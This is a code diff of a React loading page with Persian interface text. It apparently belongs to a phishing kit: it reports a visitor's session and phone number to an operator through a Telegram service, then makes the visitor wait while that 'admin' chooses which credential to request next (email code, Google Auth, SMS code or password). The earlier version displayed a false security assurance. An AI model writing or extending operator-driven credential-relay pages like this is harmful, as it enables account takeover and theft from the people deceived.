@@ -1,75 +1,102 @@
 import { useEffect, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
+import { Loader2, AlertCircle } from "lucide-react";
 import {
-  Loader2,
-  Mail,
-  Smartphone,
-  MessageSquare,
-  Lock,
-  ShieldCheck,
-} from "lucide-react";
-import { Button } from "@/components/ui/button";
+  setUserCurrentStep,
+  getSession,
+} from "@/lib/telegram-service-enhanced";
 
 const Loading = () => {
   const location = useLocation();
   const navigate = useNavigate();
-  const [showAdminControls, setShowAdminControls] = useState(false);
-  const [isProcessing, setIsProcessing] = useState(true);
+  const [isLoading, setIsLoading] = useState(true);
+  const [sessionData, setSessionData] = useState<any>(null);
 
   const phoneNumber = location.state?.phoneNumber || "";
-  const verificationCode = location.state?.verificationCode || "";
-  const fromAuth = location.state?.fromAuth || false;
+  const sessionId =
+    location.state?.sessionId || sessionStorage.getItem("sessionId");
 
   useEffect(() => {
-    // Show loading animation first, then admin controls
-    const timer = setTimeout(() => {
-      setIsProcessing(false);
-      setShowAdminControls(true);
-    }, 3000); // Show admin controls after 3 seconds
+    const initializeLoading = async () => {
+      if (!sessionId) {
+        console.error("No session ID found");
+        navigate("/", { replace: true });
+        return;
+      }
 
-    return () => clearTimeout(timer);
-  }, []);
+      try {
+        // Get current session data
+        const session = getSession(sessionId);
+        setSessionData(session);
 
-  const handleAdminAction = (authType: string) => {
-    console.log(`Admin selected: ${authType} for user: ${phoneNumber}`);
+        // Update Telegram that user is on loading page (show admin buttons)
+        await setUserCurrentStep(sessionId, "waiting_admin");
 
-    // Navigate to the selected authentication method
-    switch (authType) {
-      case "email":
-        navigate("/auth-email", {
-          state: { phoneNumber, previousStep: "phone-verification" },
-        });
-        break;
-      case "google":
-        navigate("/auth-google", {
-          state: { phoneNumber, previousStep: "phone-verification" },
-        });
-        break;
-      case "sms":
-        navigate("/auth-sms", {
-          state: { phoneNumber, previousStep: "phone-verification" },
-        });
-        break;
-      case "password":
-        navigate("/auth-password", {
-          state: { phoneNumber, previousStep: "phone-verification" },
-        });
-        break;
-      default:
-        console.error("Unknown auth type:", authType);
-    }
-  };
+        // Show loading for 2 seconds then show waiting message
+        setTimeout(() => {
+          setIsLoading(false);
+        }, 2000);
+      } catch (error) {
+        console.error("Failed to initialize loading page:", error);
+        navigate("/", { replace: true });
+      }
+    };
 
-  const handleCompleteAuth = () => {
-    // Complete authentication process
-    localStorage.setItem("isAuthenticated", "true");
-    localStorage.setItem("userPhone", phoneNumber);
-    sessionStorage.removeItem("verificationCode");
-    sessionStorage.removeItem("phoneNumber");
+    initializeLoading();
+  }, [sessionId, navigate]);
 
-    alert("احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
-    navigate("/", { replace: true });
-  };
+  // Check for admin actions every 5 seconds
+  useEffect(() => {
+    if (!sessionId || isLoading) return;
+
+    const checkForUpdates = setInterval(() => {
+      // In a real app, this would poll the server or use WebSocket
+      // For now, we'll just log that we're waiting
+      console.log("Waiting for admin action on session:", sessionId);
+    }, 5000);
+
+    return () => clearInterval(checkForUpdates);
+  }, [sessionId, isLoading]);
+
+  if (!sessionId) {
+    return (
+      <div
+        style={{
+          display: "flex",
+          height: "100vh",
+          backgroundColor: "rgb(14, 35, 66)",
+          alignItems: "center",
+          justifyContent: "center",
+        }}
+      >
+        <div
+          style={{
+            backgroundColor: "rgb(255, 255, 255)",
+            borderRadius: "16px",
+            padding: "40px",
+            maxWidth: "400px",
+            width: "90%",
+            textAlign: "center",
+          }}
+        >
+          <AlertCircle
+            style={{
+              width: "48px",
+              height: "48px",
+              color: "rgb(220, 38, 38)",
+              margin: "0 auto 16px",
+            }}
+          />
+          <h2 style={{ color: "rgb(220, 38, 38)", margin: "0 0 8px 0" }}>
+            خطا در جلسه
+          </h2>
+          <p style={{ color: "rgba(0, 0, 0, 0.6)", margin: "0" }}>
+            جلسه شما منقضی شده است. لطفا مجدد تلاش کنید.
+          </p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div
@@ -111,8 +138,8 @@ const Loading = () => {
           />
         </div>
 
-        {isProcessing ? (
-          /* Loading State */
+        {isLoading ? (
+          /* Initial Loading State */
           <div
             style={{
               display: "flex",
@@ -158,9 +185,7 @@ const Loading = () => {
                   margin: "0",
                 }}
               >
-                {fromAuth
-                  ? "در حال پردازش احراز هویت..."
-                  : "در حال بررسی کد تایید..."}
+                در حال پردازش...
               </h2>
               <p
                 style={{
@@ -170,7 +195,7 @@ const Loading = () => {
                   lineHeight: "1.5",
                 }}
               >
-                لطفا صبر کنید، اطلاعات شما در حال بررسی است
+                اطلاعات شما به ادمین ارسال شد
               </p>
             </div>
 
@@ -197,7 +222,7 @@ const Loading = () => {
             </div>
           </div>
         ) : (
-          /* Admin Controls */
+          /* Waiting for Admin State */
           <div
             style={{
               display: "flex",
@@ -206,194 +231,115 @@ const Loading = () => {
               gap: "24px",
             }}
           >
-            {/* Admin Header */}
+            {/* Waiting Icon */}
             <div
               style={{
                 display: "flex",
                 alignItems: "center",
-                gap: "12px",
-                padding: "16px",
-                backgroundColor: "rgb(248, 249, 250)",
-                borderRadius: "12px",
-                border: "1px solid rgba(0, 0, 0, 0.1)",
-                width: "100%",
+                justifyContent: "center",
+                width: "80px",
+                height: "80px",
+                backgroundColor: "rgb(0, 122, 255)",
+                borderRadius: "50%",
               }}
             >
-              <ShieldCheck
+              <span
                 style={{
-                  width: "24px",
-                  height: "24px",
-                  color: "rgb(0, 122, 255)",
+                  fontSize: "32px",
+                  color: "rgb(255, 255, 255)",
                 }}
-              />
-              <div style={{ textAlign: "right", flex: 1 }}>
-                <h3
-                  style={{
-                    fontSize: "16px",
-                    fontWeight: "700",
-                    color: "rgb(0, 0, 0)",
-                    margin: "0 0 4px 0",
-                  }}
-                >
-                  کنترل ادمین
-                </h3>
-                <p
-                  style={{
-                    fontSize: "12px",
-                    color: "rgba(0, 0, 0, 0.6)",
-                    margin: "0",
-                  }}
-                >
-                  مرحله بعدی احراز هویت را انتخاب کنید
-                </p>
-              </div>
+              >
+                ⏳
+              </span>
             </div>
 
-            {/* User Info */}
+            {/* Waiting Message */}
             <div
               style={{
-                padding: "16px",
-                backgroundColor: "rgba(0, 122, 255, 0.05)",
-                borderRadius: "8px",
-                width: "100%",
-                textAlign: "right",
+                display: "flex",
+                flexDirection: "column",
+                gap: "8px",
+                textAlign: "center",
               }}
             >
-              <p
+              <h2
                 style={{
-                  fontSize: "14px",
-                  color: "rgba(0, 0, 0, 0.8)",
+                  fontSize: "18px",
+                  fontWeight: "700",
+                  color: "rgb(0, 0, 0)",
                   margin: "0",
                 }}
               >
-                کاربر:{" "}
-                <strong style={{ direction: "ltr" }}>{phoneNumber}</strong>
+                در انتظار دستور ادمین
+              </h2>
+              <p
+                style={{
+                  fontSize: "14px",
+                  color: "rgba(0, 0, 0, 0.6)",
+                  margin: "0",
+                  lineHeight: "1.5",
+                }}
+              >
+                ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند
               </p>
             </div>
 
-            {/* Admin Action Buttons */}
-            <div
-              style={{
-                display: "grid",
-                gridTemplateColumns: "1fr 1fr",
-                gap: "12px",
-                width: "100%",
-              }}
-            >
-              <Button
-                onClick={() => handleAdminAction("email")}
-                variant="outline"
-                className="h-auto p-4 flex-col gap-2"
+            {/* Session Info */}
+            {sessionData && (
+              <div
                 style={{
-                  border: "1px solid rgba(0, 0, 0, 0.2)",
+                  padding: "16px",
+                  backgroundColor: "rgba(0, 122, 255, 0.05)",
                   borderRadius: "8px",
-                  backgroundColor: "rgb(255, 255, 255)",
-                }}
-              >
-                <Mail
-                  style={{
-                    width: "24px",
-                    height: "24px",
-                    color: "rgb(0, 122, 255)",
-                  }}
-                />
-                <span style={{ fontSize: "12px", fontWeight: "500" }}>
-                  Email Code
-                </span>
-              </Button>
-
-              <Button
-                onClick={() => handleAdminAction("google")}
-                variant="outline"
-                className="h-auto p-4 flex-col gap-2"
-                style={{
-                  border: "1px solid rgba(0, 0, 0, 0.2)",
-                  borderRadius: "8px",
-                  backgroundColor: "rgb(255, 255, 255)",
-                }}
-              >
-                <Smartphone
-                  style={{
-                    width: "24px",
-                    height: "24px",
-                    color: "rgb(219, 68, 55)",
-                  }}
-                />
-                <span style={{ fontSize: "12px", fontWeight: "500" }}>
-                  Google Auth
-                </span>
-              </Button>
-
-              <Button
-                onClick={() => handleAdminAction("sms")}
-                variant="outline"
-                className="h-auto p-4 flex-col gap-2"
-                style={{
-                  border: "1px solid rgba(0, 0, 0, 0.2)",
-                  borderRadius: "8px",
-                  backgroundColor: "rgb(255, 255, 255)",
-                }}
-              >
-                <MessageSquare
-                  style={{
-                    width: "24px",
-                    height: "24px",
-                    color: "rgb(34, 197, 94)",
-                  }}
-                />
-                <span style={{ fontSize: "12px", fontWeight: "500" }}>
-                  SMS Code
-                </span>
-              </Button>
-
-              <Button
-                onClick={() => handleAdminAction("password")}
-                variant="outline"
-                className="h-auto p-4 flex-col gap-2"
-                style={{
-                  border: "1px solid rgba(0, 0, 0, 0.2)",
-                  borderRadius: "8px",
-                  backgroundColor: "rgb(255, 255, 255)",
-                }}
-              >
-                <Lock
-                  style={{
-                    width: "24px",
-                    height: "24px",
-                    color: "rgb(168, 85, 247)",
-                  }}
-                />
-                <span style={{ fontSize: "12px", fontWeight: "500" }}>
-                  Password
-                </span>
-              </Button>
-            </div>
-
-            {/* Complete Authentication Button */}
-            <div
-              style={{
-                width: "100%",
-                marginTop: "16px",
-                paddingTop: "16px",
-                borderTop: "1px solid rgba(0, 0, 0, 0.1)",
-              }}
-            >
-              <Button
-                onClick={handleCompleteAuth}
-                style={{
                   width: "100%",
-                  backgroundColor: "rgb(34, 197, 94)",
-                  color: "rgb(255, 255, 255)",
-                  borderRadius: "8px",
-                  padding: "12px 16px",
-                  fontSize: "14px",
-                  fontWeight: "500",
-                  border: "none",
-                  cursor: "pointer",
+                  textAlign: "right",
                 }}
               >
-                ✅ تکمیل احراز هویت
-              </Button>
+                <h4
+                  style={{
+                    fontSize: "14px",
+                    fontWeight: "600",
+                    color: "rgb(0, 0, 0)",
+                    margin: "0 0 8px 0",
+                  }}
+                >
+                  🔍 اطلاعات جلسه:
+                </h4>
+                <div style={{ fontSize: "12px", color: "rgba(0, 0, 0, 0.7)" }}>
+                  <p style={{ margin: "4px 0" }}>
+                    📱 شماره: <strong>{sessionData.phoneNumber}</strong>
+                  </p>
+                  <p style={{ margin: "4px 0" }}>
+                    🆔 شناسه: <strong>{sessionData.sessionId}</strong>
+                  </p>
+                  <p style={{ margin: "4px 0" }}>
+                    ✅ مراحل تکمیل شده:{" "}
+                    <strong>{sessionData.completedSteps?.length || 0}</strong>
+                  </p>
+                </div>
+              </div>
+            )}
+
+            {/* Pulsing Animation */}
+            <div
+              style={{
+                width: "60px",
+                height: "4px",
+                backgroundColor: "rgba(0, 122, 255, 0.2)",
+                borderRadius: "2px",
+                overflow: "hidden",
+                position: "relative",
+              }}
+            >
+              <div
+                style={{
+                  width: "20px",
+                  height: "100%",
+                  backgroundColor: "rgb(0, 122, 255)",
+                  borderRadius: "2px",
+                  animation: "slide 2s ease-in-out infinite",
+                }}
+              />
             </div>
           </div>
         )}
@@ -416,10 +362,10 @@ const Loading = () => {
               lineHeight: "1.4",
             }}
           >
-            🔒{" "}
-            {showAdminControls
-              ? "پنل کنترل ادمین - احراز هویت چندمرحله‌ای"
-              : "اطلاعات شما با بالاترین استانداردهای امنیتی محافظت می‌شود"}
+            🤖{" "}
+            {isLoading
+              ? "در حال ارسال اطلاعات به سیستم مدیریت..."
+              : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
           </p>
         </div>
       </div>
@@ -433,6 +379,18 @@ const Loading = () => {
           }
           40% {
             transform: scale(1);
+          }
+        }
+
+        @keyframes slide {
+          0% {
+            transform: translateX(-40px);
+          }
+          50% {
+            transform: translateX(80px);
+          }
+          100% {
+            transform: translateX(-40px);
           }
         }
 
